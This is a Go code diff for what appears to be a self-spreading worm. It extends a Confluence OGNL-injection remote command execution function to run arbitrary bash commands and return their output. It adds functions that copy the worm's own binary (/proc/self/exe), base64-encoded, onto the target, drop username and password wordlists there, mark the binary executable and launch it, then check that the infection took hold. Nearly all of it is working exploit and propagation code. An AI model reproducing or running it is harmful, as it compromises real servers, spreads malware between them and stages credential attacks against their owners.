@@ -5,29 +5,19 @@ import (
 	"log"
 	"net/http"
   "net/url"
+	"strings"
+	"encoding/base64"
+	"fmt"
 )
 
-func ConfluenceCmdExecute(targetUrl string, endpoint string) string {
 
-  var cmd string
-	cmd = "mkdir /tmp/confluenceTest"
+func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string {
 
   exploitUrl := targetUrl + endpoint
-  /* This is used in the python script
-  postHeader, _ := json.Marshal(map[string]string{
-    "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-    "Connection": "close",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Accept-Encoding": "gzip, deflate",
-  })
-  */
-  /*postData, _ := json.Marshal(map[string]string {
-    "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027",
-  })*/
 
   postData := make(url.Values)
-  postData.Add("queryString", "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var cmd = new java.lang.String(\\u0022" + cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027") 
-  
+  postData.Add("queryString", "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var cmd = new java.lang.String(\\u0022" + cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027")
+
   response, err := http.PostForm(exploitUrl, postData)
 
   if err != nil {
@@ -44,5 +34,38 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string) string {
 
   log.Println(sb)
 
-  return "ConfluenceCmdExecute Finished"
+  return sb
   }
+
+	func ConfluenceCheckInfection(url string, endpoint string) bool {
+		command := fmt.Sprintf("ls -l %s", wormPath)
+		resp := ConfluenceCmdExecute(url, endpoint, command)
+		return strings.Contains(resp, wormPath)
+	}
+
+	func ConfluenceInfect(url string, endpoint string) bool {
+		var worm []byte
+		var copyTemplate string
+
+		copyTemplate = "echo '%s' | base64 -d > %s"
+
+		worm = GetFile("/proc/self/exe")
+		worm64 := base64.StdEncoding.EncodeToString(worm)
+		command := fmt.Sprintf(copyTemplate, worm64, wormPath)
+		ConfluenceCmdExecute(url, endpoint, command)
+
+		usersFile := GetFile("./users.txt")
+		usersFile64 := base64.StdEncoding.EncodeToString(usersFile)
+		command = fmt.Sprintf(copyTemplate, usersFile64, "/tmp/users.txt")
+		ConfluenceCmdExecute(url, endpoint, command)
+
+		passwordFile := GetFile("./passwords.txt")
+		passwordFile64 := base64.StdEncoding.EncodeToString(passwordFile)
+		command = fmt.Sprintf(copyTemplate, passwordFile64, "/tmp/passwords.txt")
+		ConfluenceCmdExecute(url, endpoint, command)
+
+		command = fmt.Sprintf("chmod u+x %s && %s", wormPath, wormPath)
+		ConfluenceCmdExecute(url, endpoint, command)
+
+		return ConfluenceCheckInfection(url, endpoint)
+	}
